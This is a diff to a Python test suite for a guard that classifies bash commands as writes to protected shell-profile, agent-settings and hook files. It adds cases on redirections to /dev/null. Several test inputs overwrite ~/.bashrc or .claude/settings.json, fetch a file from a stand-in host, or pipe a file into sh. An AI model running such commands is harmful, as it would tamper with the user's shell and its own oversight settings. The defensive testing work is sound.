@@ -220,7 +220,19 @@ SHELL_WRITES = [
     "dd if=/dev/null of=~/hooks/on-stop.sh",
     "curl -o ~/.bashrc https://example.invalid/x",
     "git checkout other -- .claude/settings.json",
-    "cat ~/.bashrc > /dev/null",          # a redirection: not parsed, refused
+    "cat ~/.bashrc > /dev/nullx",         # a redirection to a file: not parsed, refused
+    # A redirection to /dev/null is no write (#59), but it hides nothing else.
+    "cd ~ 2>/dev/null || cp evil ~/.bashrc",
+    "echo x 2>/dev/null >~/.bashrc",
+    "cat ~/.bashrc 2>/dev/null > ~/.claude/settings.json",
+    "echo x 2>/dev/null 1>~/.bashrc",
+    "echo x 2>/dev/null;>~/.bashrc",
+    "cat ~/.bashrc 2>/dev/null&>~/.profile",
+    "echo x 2>~/.bashrc",
+    "cat ~/.bashrc >/dev/null | tee ~/.bashrc",
+    "cat ~/.bashrc 2>/dev/null $(echo x)",
+    "cd ~ 2>/dev/null && curl -O https://example.invalid/x",
+    "cd ~/Wordsworth 2>/dev/null; git log",  # a name in ~ and a program that is no reader
     "cat ~/.bashrc | sh",                # a program that is not a reader
     "cat $(echo ~/.bashrc)",
     "rm .claude/sett*",
@@ -239,6 +251,15 @@ SHELL_READS_AND_UNRELATED = [
     "ls -la ~/.claude/agents",
     "head -5 .claude/settings.local.json",
     "cat ~/.claude/settings.json | jq .hooks",
+    # A redirection that sends nothing anywhere writes no file (#59).
+    "cat ~/.bashrc > /dev/null",
+    "cat ~/.bashrc 2>/dev/null",
+    "grep -n hooks ~/.claude/settings.json 2>&1",
+    "cd ~/wordsworth 2>/dev/null || cd ~/Wordsworth",
+    "cd ~/wordsworth >/dev/null || cd ~/Wordsworth",
+    "cd ~/wordsworth &>/dev/null || cd ~/Wordsworth",
+    "cd ~/wordsworth 2>/dev/null; pwd",
+    "ls ~/.claude 2>/dev/null; pwd",
     "cd ~/.claude && ls",
     "wc -l ~/hooks/audit.py",
     "ls ~/.claude/*.json",
@@ -269,6 +290,23 @@ def test_reading_them_and_writing_elsewhere_is_not(env, command):
     ctx = dataclasses.replace(ctx, temp_roots=(str(tmp_path),))
     verdict = bash(command, ctx)
     assert not verdict.gated, (command, verdict)
+
+
+def test_a_cd_with_its_errors_sent_to_dev_null_is_a_read_issue_59(env):
+    """The shape from #59: an existing checkout in ~, a second spelling that
+    does not exist (a name directly in ~), stderr to /dev/null."""
+    tmp_path, _, ctx = env
+    (tmp_path / "home" / "wordsworth").mkdir()
+    for command in ("cd ~/wordsworth 2>/dev/null || cd ~/Wordsworth",
+                    "cd ~/wordsworth 2>/dev/null || cd ~/Wordsworth; pwd",
+                    "cd ~/wordsworth 2>/dev/null; pwd"):
+        assert not bash(command, ctx).gated, command
+    # Run from the home directory itself, where every call counts as one that
+    # may land in it: still a read.
+    import dataclasses
+    home_ctx = dataclasses.replace(ctx, cwd=tmp_path / "home")
+    assert not bash("cd ~/wordsworth 2>/dev/null || cd ~/Wordsworth", home_ctx).gated
+    assert bash("cd ~/wordsworth 2>/dev/null || touch x", home_ctx).classes == ("self",)
 
 
 def test_self_wins_over_run_it_alone_and_is_never_anything_else(env):
